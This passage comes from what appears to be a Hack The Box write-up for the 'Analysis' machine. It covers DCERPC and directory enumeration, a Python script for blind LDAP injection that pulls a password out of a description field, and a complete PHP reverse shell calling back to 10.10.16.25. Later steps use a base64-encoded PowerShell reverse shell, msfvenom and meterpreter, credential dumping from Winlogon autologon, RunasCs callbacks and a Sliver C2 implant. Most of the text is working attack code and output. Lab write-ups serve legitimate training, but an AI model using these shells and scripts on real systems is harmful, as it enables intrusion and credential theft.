[*] 10.129.36.127:135      -      killed: 00000005
[*] 10.129.36.127:135      -      name: 00010000000000000100000000000000d3060000
[*] 10.129.36.127:135      - UUID 000001a0-0000-0000-c000-000000000046 v0.0
[*] 10.129.36.127:135      - Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
[*] 10.129.36.127:135      -      listening: 00000000
[*] 10.129.36.127:135      -      killed: 00000005
[*] 10.129.36.127:135      -      name: 00010000000000000100000000000000d3060000
[*] 10.129.36.127:135      - UUID cb40a179-20e1-43f0-97fb-3c5c6ff37ec3 v0.0
[*] 10.129.36.127:135      - Remote Management Interface Error: DCERPC FAULT => nca_s_fault_ndr
[*] 10.129.36.127:135      -      listening: 00000000
[*] 10.129.36.127:135      -      killed: 00000005
[*] 10.129.36.127:135      -      name: 00010000000000000100000000000000d3060000
[*] 10.129.36.127:135      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```c
msf6 auxiliary(scanner/dcerpc/management) > use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
msf6 auxiliary(scanner/dcerpc/tcp_dcerpc_auditor) > run

10.129.36.127 - UUID 99fcfec4-5260-101b-bbcb-00aa0021347a 0.0 OPEN VIA 135 ACCESS GRANTED 00000000000000000000000000000000000000000000000076070000
10.129.36.127 - UUID afa8bd80-7d8a-11c9-bef4-08002b102989 1.0 OPEN VIA 135 ACCESS GRANTED 000002000d0000000d00000004000200080002000c0002001000020014000200180002001c0002002000020024000200280002002c00020030000200340002000883afe11f5dc91191a408002b14a0fa0300000084650a0b0f9ecf11a3cf00805f68cb1b0100010026b5551d37c1c546ab79638f2a68e869010000007f0bfe64f59e5345a7db9a197577755401000000e6730ce6f988cf119af10020af6e72f402000000c4fefc9960521b10bbcb00aa0021347a00000000609ee7b9523dce11aaa100006901293f000002001e242f412ac1ce11abff0020af6e7a17000002003601000000000000c0000000000000460000000072eef3c67eced111b71e00c04fc3111a01000000b84a9f4d1c7dcf11861e0020af6e7c5700000000a001000000000000c0000000000000460000000079a140cbe120f04397fb3c5c6ff37ec30000000000000000
[*] 10.129.36.127:135      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```c
┌──(user㉿kali)-[~]
└─$ rpcclient -N 10.129.36.127 -U ""
```

### More Directory Busting with Gobuster

```c
┌──(user㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://internal.analysis.htb/ -x php    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://internal.analysis.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/users                (Status: 301) [Size: 170] [--> http://internal.analysis.htb/users/]
/dashboard            (Status: 301) [Size: 174] [--> http://internal.analysis.htb/dashboard/]
/employees            (Status: 301) [Size: 174] [--> http://internal.analysis.htb/employees/]
```

```c
┌──(user㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://internal.analysis.htb/users/ -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://internal.analysis.htb/users/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/list.php             (Status: 200) [Size: 17]
```

## LDAP Injection

> https://book.hacktricks.xyz/pentesting-web/ldap-injection

> http://internal.analysis.htb/users/list.php?name

> http://internal.analysis.htb/users/list.php?name=*

| Username |
| --- |
| technician |

> http://internal.analysis.htb/users/list.php?name=L*

> http://internal.analysis.htb/users/list.php?name=amanson))%00

| Username |
| --- |
| amanson |
| lzen |
| jangel |
| badam |

```c
┌──(user㉿kali)-[/media/…/htb/machines/analysis/files]
└─$ cat ldapenum.py 
#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

proxy = {"http": "http://localhost:8080"}
url = "http://internal.analysis.htb/users/list.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["description"]

# Combine existing users with new users in the same array
users = [
    "technician", "ajohnson", "amanson", "badam", "cwilliams", "jangel", "jdoe", "lzen", "technician", "wsmith",
    "manson", "andrew", "badam", "adam", "barry", "pleazkin", "technician", "angel", "johnson", "jangel", "zen", "liam", "lzen"
]

#users = ["technician"]
# Remove duplicates and sort the list
users = sorted(set(users))

for user in users:  # Iterate over each user
    print(f"--- Extracting data for user: {user} ---")
    for attribute in attributes:  # Extract all attributes
        value = ""
        finish = False
        while not finish:
            for char in alphabet:  # In each position test each possible printable char
                query = f"{user})({attribute}={value}{char}*"
                data = {'name': query}
                r = requests.get(url, params=data)
                sys.stdout.write(f"\r{attribute} for {user}: {value}{char}")
                # sleep(0.5) # Avoid brute-force bans
                if user in r.text:
                    value += str(char)
                    break

                if char == alphabet[-1]:  # If last of all the chars, then no more chars in the value
                    finish = True
                    print()
        print(f"{attribute} for {user}: {value}")
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/analysis/files]
└─$ python3 ldapenum.py 
--- Extracting data for user: adam ---
description for adam: ;
description for adam: 
--- Extracting data for user: ajohnson ---
description for ajohnson: ;
description for ajohnson: 
--- Extracting data for user: amanson ---
description for amanson: ;
description for amanson: 
--- Extracting data for user: andrew ---
description for andrew: ;
description for andrew: 
--- Extracting data for user: angel ---
description for angel: ;
description for angel: 
--- Extracting data for user: badam ---
description for badam: ;
description for badam: 
--- Extracting data for user: barry ---
description for barry: ;
description for barry: 
--- Extracting data for user: cwilliams ---
description for cwilliams: ;
description for cwilliams: 
--- Extracting data for user: jangel ---
description for jangel: ;
description for jangel: 
--- Extracting data for user: jdoe ---
description for jdoe: ;
description for jdoe: 
--- Extracting data for user: johnson ---
description for johnson: ;
description for johnson: 
--- Extracting data for user: liam ---
description for liam: ;
description for liam: 
--- Extracting data for user: lzen ---
description for lzen: ;
description for lzen: 
--- Extracting data for user: manson ---
description for manson: ;
description for manson: 
--- Extracting data for user: pleazkin ---
description for pleazkin: ;
description for pleazkin: 
--- Extracting data for user: technician ---
description for technician: 97NTtl;
description for technician: 97NTtl
--- Extracting data for user: wsmith ---
description for wsmith: ;
description for wsmith: 
--- Extracting data for user: zen ---
description for zen: ;
description for zen:
```

Team effort right here. Some of us tried brute forcing the password in reverse. But since there was one special character which always broke our attempt, `yeeb` guessed that it has to be an `*` in the middle. We put both parts together and got the password.

| Username | Password |
| --- | --- |
| technician@analysis.htb | 97<--- SNIP --->bv |

> http://internal.analysis.htb/employees/login.php

```c
┌──(user㉿kali)-[/media/…/htb/machines/analysis/files]
└─$ cat a.php 
<?php
// Copyright (c) 2020 Ivan Šincek
// v2.6
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer = 1024;  // read/write buffer size
    private $clen   = 0;     // command length
    private $error  = false; // stream read/write error
    private $sdump  = true;  // script's dump
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        $os = PHP_OS;
        if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {
            $this->os    = 'LINUX';
            $this->shell = '/bin/sh';
        } else if (stripos($os, 'WINDOWS') !== false || stripos($os, 'WINNT') !== false || stripos($os, 'WIN32') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
            // once daemonized, you will actually no longer see the script's dump
        } else if (posix_setsid() < 0) {
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        if ($this->sdump) {
            $data = str_replace('<', '&lt;', $data);
            $data = str_replace('>', '&gt;', $data);
            echo $data;
        }
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set the global error flag
            echo "STRM_ERROR: Cannot read from {$name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set the global error flag
            echo "STRM_ERROR: Cannot write to {$name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $size = fstat($input)['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // so we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
                    do {
                        $status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.10.16.25', 443);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.25] from (UNKNOWN) [10.129.11.26] 57007
SOCKET: Shell has connected! PID: 8224
Microsoft Windows [version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. Tous droits r�serv�s.

C:\inetpub\internal\dashboard\uploads>
```

OR

```c
┌──(user㉿kali)-[/media/…/htb/machines/analysis/files]
└─$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.16.25 LPORT=443 -f raw -o x.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1111 bytes
Saved as: x.php
```

> http://internal.analysis.htb/dashboard/uploads/x.php

```c
msf6 auxiliary(scanner/dcerpc/tcp_dcerpc_auditor) > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.10.16.25
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.25:443 
[*] Sending stage (39927 bytes) to 10.129.11.26
[*] Meterpreter session 1 opened (10.10.16.25:443 -> 10.129.11.26:57022) at 2024-01-20 22:13:50 +0000

meterpreter >
```

```c
C:\inetpub\internal\dashboard\uploads>whoami /all

Informations sur l'utilisateur
------------------------

Nom d'utilisateur SID                                          
================= =============================================
analysis\svc_web  S-1-5-21-916175351-3772503854-3498620144-2101


Informations de groupe
----------------------

Nom du groupe                                       Type              SID                                                           Attributs                                           
=================================================== ================= ============================================================= ====================================================
Tout le monde                                       Groupe bien connu S-1-1-0                                                       Groupe obligatoire, Activ� par d�faut, Groupe activ�
BUILTIN\Utilisateurs                                Alias             S-1-5-32-545                                                  Groupe obligatoire, Activ� par d�faut, Groupe activ�
BUILTIN\Acc�s compatible pr�-Windows 2000           Alias             S-1-5-32-554                                                  Groupe obligatoire, Activ� par d�faut, Groupe activ�
AUTORITE NT\TACHE                                   Groupe bien connu S-1-5-3                                                       Groupe obligatoire, Activ� par d�faut, Groupe activ�
OUVERTURE DE SESSION DE CONSOLE                     Groupe bien connu S-1-2-1                                                       Groupe obligatoire, Activ� par d�faut, Groupe activ�
AUTORITE NT\Utilisateurs authentifi�s               Groupe bien connu S-1-5-11                                                      Groupe obligatoire, Activ� par d�faut, Groupe activ�
AUTORITE NT\Cette organisation                      Groupe bien connu S-1-5-15                                                      Groupe obligatoire, Activ� par d�faut, Groupe activ�
BUILTIN\IIS_IUSRS                                   Alias             S-1-5-32-568                                                  Groupe obligatoire, Activ� par d�faut, Groupe activ�
LOCAL                                               Groupe bien connu S-1-2-0                                                       Groupe obligatoire, Activ� par d�faut, Groupe activ�
IIS APPPOOL\internal                                Groupe bien connu S-1-5-82-780022665-423385827-2835031938-1607344665-2144950284 Groupe obligatoire, Activ� par d�faut, Groupe activ�
AUTORITE NT\Authentifications NTLM                  Groupe bien connu S-1-5-64-10                                                   Groupe obligatoire, Activ� par d�faut, Groupe activ�
�tiquette obligatoire\Niveau obligatoire moyen plus Nom               S-1-16-8448                                                                                                       


Informations de privil�ges
----------------------

Nom de privil�ge              Description                                     �tat     
============================= =============================================== =========
SeIncreaseQuotaPrivilege      Ajuster les quotas de m�moire pour un processus D�sactiv�
SeMachineAccountPrivilege     Ajouter des stations de travail au domaine      D�sactiv�
SeAuditPrivilege              G�n�rer des audits de s�curit�                  D�sactiv�
SeChangeNotifyPrivilege       Contourner la v�rification de parcours          Activ�   
SeIncreaseWorkingSetPrivilege Augmenter une plage de travail de processus     D�sactiv�


INFORMATIONS SUR LES REVENDICATIONS DE L'UTILISATEUR
----------------------------------------------------

Revendications d'utilisateur inconnues.

La prise en charge Kerberos pour le contr�le d'acc�s dynamique sur ce p�riph�rique a �t� d�sactiv�.
```

```c
C:\inetpub\internal\users>type list.php
<?php

//LDAP Bind paramters, need to be a normal AD User account.
error_reporting(0);
$ldap_password = 'N1<--- SNIP --->!j';
$ldap_username = 'webservice@analysis.htb';
$ldap_connection = ldap_connect("analysis.htb");

if(isset($_GET['name'])){
    if (FALSE === $ldap_connection) {
        // Uh-oh, something is wrong...
        echo 'Unable to connect to the ldap server';
    }
```

| Username | Password |
| --- | --- |
| webservice@analysis.htb | N1<--- SNIP --->!j |

### Stabilizing Shell

```c
C:\inetpub\internal\dashboard\uploads>powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgA1ACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
#< CLIXML
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.10.16.25] from (UNKNOWN) [10.129.36.127] 50781

PS C:\inetpub\internal\dashboard\uploads>
```

## Seatbelt

> https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe

```c
PS C:\inetpub\internal\dashboard\uploads> iwr http://10.10.16.25/Seatbelt.exe -o s.exe
```

```c
PS C:\inetpub\internal\dashboard\uploads> .\s.exe -group=system


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,
```

```c
====== WindowsAutoLogon ======

  DefaultDomainName              : analysis.htb.
  DefaultUserName                : jdoe
  DefaultPassword                : 7y<--- SNIP --->zj
  AltDefaultDomainName           : 
  AltDefaultUserName             : 
  AltDefaultPassword             :
```

```c
┌──(user㉿kali)-[~]
└─$ evil-winrm -i 10.129.36.127 -u jdoe -p '7y<--- SNIP --->zj'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jdoe\Documents>
```

OR

```c
PS C:\inetpub\internal\dashboard\uploads> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    analysis.htb.
    DefaultUserName    REG_SZ    jdoe
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x103bff874
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    7y<--- SNIP --->zj
    AutoLogonSID    REG_SZ    S-1-5-21-916175351-3772503854-3498620144-1103
    LastUsedUsername    REG_SZ    jdoe

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\VolatileUserMgrKey
```

## user.txt

```c
*Evil-WinRM* PS C:\Users\jdoe\Desktop> type user.txt
6f59c53f64d46000cea036f5c20ab7a2
```

## Pivoting

```c
*Evil-WinRM* PS C:\Users\jdoe\Desktop> whoami /all

USER INFORMATION
----------------

User Name     SID
============= =============================================
analysis\jdoe S-1-5-21-916175351-3772503854-3498620144-1103


GROUP INFORMATION
-----------------

Group Name                                          Type             SID          Attributes
=================================================== ================ ============ ==================================================
Tout le monde                                       Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Utilisateurs de gestion … distance          Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Utilisateurs                                Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\AccŠs compatible pr‚-Windows 2000           Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
AUTORITE NT\RESEAU                                  Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
AUTORITE NT\Utilisateurs authentifi‚s               Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
AUTORITE NT\Cette organisation                      Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
AUTORITE NT\Authentifications NTLM                  Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
tiquette obligatoire\Niveau obligatoire moyen plus Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

## Privilege Escalation to webservice

> https://github.com/antonioCoco/RunasCs/releases/tag/v1.5

```c
*Evil-WinRM* PS C:\Users\jdoe\Downloads> iwr http://10.10.16.25/RunasCs.exe -o RunasCs.exe
```

```c
*Evil-WinRM* PS C:\Users\jdoe\Downloads> .\RunasCs.exe webservice 'N1<--- SNIP --->!j' cmd.exe -r 10.10.16.25:4444
[*] Warning: The logon for user 'webservice' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-50b5d7$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 8692 created in background.
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.25] from (UNKNOWN) [10.129.36.127] 59487
Microsoft Windows [version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. Tous droits r�serv�s.

C:\Windows\system32>
```

## Quality of Live Improvements

```c
┌──(user㉿kali)-[~/opt/c2/sliver]
└─$ ./sliver-server_linux 
[*] Loaded 20 aliases from disk
[*] Loaded 104 extension(s) from disk

.------..------..------..------..------..------.
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
| :\/: || (__) || :\/: || ()() || :\/: || ()() |
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'

All hackers gain dethrone
[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

[server] sliver > generate --http 10.10.16.25 --os windows --arch amd64 --format exe --save /media/sf_infosec/htb/machines/analytics/serve/

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 31s
[*] Implant saved to /home/user/opt/c2/sliver/ROUGH_NEWS.exe

[server] sliver > http

[*] Starting HTTP :80 listener ...
[*] Successfully started job #1

[*] Session 69f5096f ROUGH_NEWS - 10.129.36.127:58073 (DC-ANALYSIS) - windows/amd64 - Sat, 20 Jan 2024 23:09:52 UTC

[server] sliver > sessions

